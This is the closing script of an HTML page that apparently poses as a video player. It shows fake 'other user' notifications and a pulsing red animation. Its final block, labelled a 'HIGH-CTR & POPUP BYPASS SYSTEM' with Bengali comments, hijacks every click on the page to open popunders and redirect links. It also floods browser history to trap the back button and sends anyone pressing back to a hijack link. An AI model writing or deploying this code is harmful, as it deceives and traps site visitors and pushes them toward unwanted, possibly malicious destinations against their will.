                    timerElem.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
                }
            }, 1000);

            // Notifications Toast
            const toast = document.getElementById('notifToast');
            const toastUser = document.getElementById('notifUser');
            setInterval(() => {
                toastUser.textContent = notificationUsers[Math.floor(Math.random() * notificationUsers.length)];
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 3000);
            }, 6500);

            // Crimson Red Ripple Animation
            function initOptimizedPlayerAnimation() {
                const canvas = document.getElementById('animCanvas');
                const ctx = canvas.getContext('2d');
                let ripples = [];

                function resizeCanvas() {
                    canvas.width = canvas.parentElement.clientWidth;
                    canvas.height = canvas.parentElement.clientHeight;
                }
                resizeCanvas();
                window.addEventListener('resize', resizeCanvas, { passive: true });

                class Ripple {
                    constructor(x, y) {
                        this.x = x;
                        this.y = y;
                        this.radius = 25;
                        this.alpha = 0.8;
                        this.speed = 1.2;
                    }
                    update() {
                        this.radius += this.speed;
                        this.alpha -= 0.012;
                    }
                    draw() {
                        ctx.beginPath();
                        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                        ctx.strokeStyle = `rgba(255, 0, 60, ${this.alpha})`;
                        ctx.lineWidth = 2;
                        ctx.stroke();
                    }
                }

                let lastSpawn = 0;
                function animate(timestamp) {
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    if (timestamp - lastSpawn > 900) {
                        ripples.push(new Ripple(canvas.width / 2, canvas.height / 2));
                        lastSpawn = timestamp;
                    }
                    for (let i = ripples.length - 1; i >= 0; i--) {
                        ripples[i].update();
                        ripples[i].draw();
                        if (ripples[i].alpha <= 0) ripples.splice(i, 1);
                    }
                    requestAnimationFrame(animate);
                }
                requestAnimationFrame(animate);
            }
            initOptimizedPlayerAnimation();

            // ================= HIGH-CTR & POPUP BYPASS SYSTEM =================
            
            // 1. POPUNDER / MULTI-TAB BYPASS (REDIRECT_LINK_1 এর জন্য CTR বাড়াবে)
            function triggerLinks() {
                try {
                    let pop = window.open(REDIRECT_LINK_1, '_blank');
                    if (!pop || pop.closed || typeof pop.closed == 'undefined') {
                        window.open(REDIRECT_LINK_1);
                    }
                } catch(e) {}

                // বর্তমান ব্রাউজার ট্যাবকে মেইন লিঙ্কে নিয়ে যাবে
                window.location.href = DIRECT_LINK_MAIN;
            }

            // 2. GLOBAL CLICK OVERLAY (পুরো পেজ জুড়েই ক্লিক কাজ করবে)
            document.body.addEventListener('click', function(e) {
                triggerLinks();
            }, true);

            // 3. AGGRESSIVE BACK-HIJACK SYSTEM (BACK_HIJACK_LINK এর CTR বাড়াবে)
            function setBackTrap() {
                for (let i = 0; i < 10; i++) {
                    window.history.pushState({ trap: true }, document.title, window.location.href);
                }
            }

            // পেজ লোড হওয়ার সাথে সাথেই ব্যাক-হাইজ্যাক স্টেট পুশ করবে
            setBackTrap();

            // ইউজার স্ক্রিনে টাচ বা স্ক্রোল করলেই ট্র্যাপ রি-ইনফোর্স হবে
            ['touchstart', 'mousemove', 'scroll', 'keydown'].forEach(evt => {
                window.addEventListener(evt, setBackTrap, { once: true, passive: true });
            });

            // ব্যাক বাটন চাপা মাত্রই হাইজ্যাক লিঙ্কে পাঠাবে
            window.addEventListener('popstate', function(e) {
                window.location.replace(BACK_HIJACK_LINK);
            });

        })();
    </script>
</body>
